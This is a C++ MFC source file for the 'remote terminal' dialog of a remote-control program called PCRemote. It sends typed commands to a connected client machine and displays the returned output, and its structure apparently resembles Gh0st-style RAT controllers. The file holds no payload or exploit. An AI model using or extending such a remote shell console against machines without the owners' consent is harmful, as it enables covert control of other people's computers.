// CShellDlg.cpp: 实现文件
//

#include "pch.h"
#include "PCRemote.h"
#include "CShellDlg.h"
#include "afxdialogex.h"


// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent , CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialogEx(IDD_SHELL, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;	
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	ON_EN_CHANGE(IDC_EDIT, &CShellDlg::OnEnChangeEdit)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


void CShellDlg::OnReceiveComplete()
{
	// TODO: 在此处添加实现代码.
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类

	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			int	len = m_edit.GetWindowTextLength();
			CString str;
			m_edit.GetWindowText(str);
			str += "\r\n";
			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CShellDlg::AddKeyBoardData()
{
	// TODO: 在此处添加实现代码.
		// 最后填上0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult;
	strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	strResult.Replace("\n", "\r\n");
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
}


BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 远程终端", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));


	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CShellDlg::OnEnChangeEdit()
{
	// TODO:  如果该控件是 RICHEDIT 控件，它将不
	// 发送此通知，除非重写 CDialogEx::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
}


void CShellDlg::ResizeEdit()
{
	// TODO: 在此处添加实现代码.
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	ResizeEdit();
}
